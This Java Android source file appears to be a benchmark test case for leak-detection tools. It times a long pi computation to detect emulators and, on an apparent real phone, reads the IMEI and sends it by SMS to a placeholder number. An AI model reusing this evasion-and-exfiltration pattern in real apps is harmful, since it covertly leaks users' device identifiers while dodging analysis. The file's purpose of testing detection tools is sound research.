package com.example.newedtester;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.TimeZone;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.View;

import android.view.Menu;
import android.widget.Button;
import android.widget.TextView;

/**
 * @testcase_name EmulatorDetection_PI1
 * @version 0.1
 * @author Malviya National Institute of Technology, Jaipur INDIA 
 * @author_mail jyotigajrani@gmail.com
 * 
 * @description This test detects the Android emulator by doing a large computation
 * i.e calculating value of pi till n decimal places. A threshhold value is obtained
 * by doing experiments on 100 devices and emulators. Based on this threshhold value,
 * a decision is taken. This app send IMEI number  via SMS if the app runs on a real
 * phone.
 * @dataflow onCreate: imei -> SMS 
 * @number_of_leaks 1
 * @challenges The (dynamic) analysis must avoid being detected and circumvented.
 */
public class MainActivity extends Activity implements View.OnClickListener {
	TextView txtStatus;
	TextView txt2;
	TextView txt3;

	@Override
	protected void onCreate(Bundle savedInstanceState) {

		String status = "Can't Detect";
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		Button btn = (Button) findViewById(R.id.button2);
		btn.setOnClickListener(this);
		txtStatus = (TextView) findViewById(R.id.txtStatus);
		txt2 = (TextView) findViewById(R.id.txt2);
		txt3 = (TextView) findViewById(R.id.txt3);

	}

	public static double computePi() {
		double n = 999999999;
		double sequenceFormula = 0;
		for (int counter = 1; counter < n; counter += 2) {
			sequenceFormula = sequenceFormula
					+ ((1.0 / (2.0 * counter - 1)) - (1.0 / (2.0 * counter + 1)));
		}
		double pi = 4 * sequenceFormula;
		return pi;
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public void onClick(View view) {
		// TODO Auto-generated method stub
		int id = view.getId();
		if (id == R.id.button2) {

			Calendar cal = Calendar.getInstance(TimeZone
					.getTimeZone("GMT+5:30"));
			Date currentLocalTime = cal.getTime();
			DateFormat date = new SimpleDateFormat("KK:mm:ss");
			date.setTimeZone(TimeZone.getTimeZone("GMT+5:30"));
			String localTime = date.format(currentLocalTime);
			long timestamp = System.currentTimeMillis();
			txtStatus
					.setText("Time before starting calculation:- " + localTime);
			computePi();
			Calendar cal1 = Calendar.getInstance(TimeZone
					.getTimeZone("GMT+5:30"));
			Date currentLocalTime1 = cal1.getTime();
			DateFormat date1 = new SimpleDateFormat("KK:mm:ss");
			date1.setTimeZone(TimeZone.getTimeZone("GMT+5:30"));
			String localTime2 = date.format(currentLocalTime1);
			// String localTime2 = date.format(currentLocalTime);
			long timestamp2 = System.currentTimeMillis();

			int duration = (int) (timestamp2 - timestamp);
			String strDuration = " ";
			int hours, minutes, seconds;
			hours = minutes = seconds = 0;

			if (duration > 1000) {
				seconds = (int) (duration / 1000) % 60;
				minutes = (int) ((duration / (1000 * 60)) % 60);
				hours = (int) ((duration / (1000 * 60 * 60)) % 24);
			}
			if (hours > 0)
				strDuration += hours + " Hours ";

			if (minutes > 0)
				strDuration += minutes + "Min. ";

			if (seconds > 0)
				strDuration += seconds + "Sec.";
			txt2.setText("Time After starting calculation:- " + localTime2
					+ "\n\n\n Total Time taken:-" + strDuration);
			if (minutes > 1 && seconds > 40)
				txt3.setText("Time: Possibly Emulator");
			else {

				TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
				String imei = telephonyManager.getDeviceId();

				SmsManager sm = SmsManager.getDefault();
				String number = "+49 1234";
				sm.sendTextMessage(number, null, imei, null, null); // sink,
																	// potential
																	// leak
				txt3.setText("Time: Possibly Device");
			}
		}
	}

}